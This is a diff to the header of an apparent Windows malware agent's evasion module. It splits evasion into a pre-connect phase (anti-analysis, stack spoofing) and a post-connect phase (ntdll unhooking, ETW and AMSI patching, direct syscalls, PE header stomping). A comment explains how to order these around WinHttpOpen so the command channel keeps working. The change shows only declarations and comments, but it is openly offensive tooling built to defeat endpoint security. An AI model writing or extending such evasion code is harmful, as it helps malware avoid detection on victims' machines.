@@ -156,10 +156,19 @@ BOOL evasion_stomp_pe_headers(void);
  * ═══════════════════════════════════════════════════════════════════ */
 
 /*
- * Run all configured evasion patches based on config.h flags.
- * Order: anti-analysis → unhook ntdll → ETW → AMSI → syscalls → stack spoof → PE stomp
- * Returns FALSE if anti-analysis check fails (agent should exit).
+ * Split evasion init — use these in agent_init() around channel_init_active():
+ *
+ *   evasion_init_pre_connect()   — anti-analysis + stack spoof
+ *   channel_init_active()        — WinHttpOpen (needs clean ETW/ntdll)
+ *   evasion_init_post_connect()  — unhook ntdll + ETW + AMSI + syscalls + PE stomp
+ *
+ * WinHTTP uses ETW internally during WinHttpOpen; patching ETW or
+ * unhooking ntdll before that call breaks the HTTP session.
  */
+BOOL evasion_init_pre_connect(void);
+BOOL evasion_init_post_connect(void);
+
+/* Legacy single-call wrapper (calls both phases back-to-back). */
 BOOL evasion_init(void);
 
 #endif /* EVASION_H */
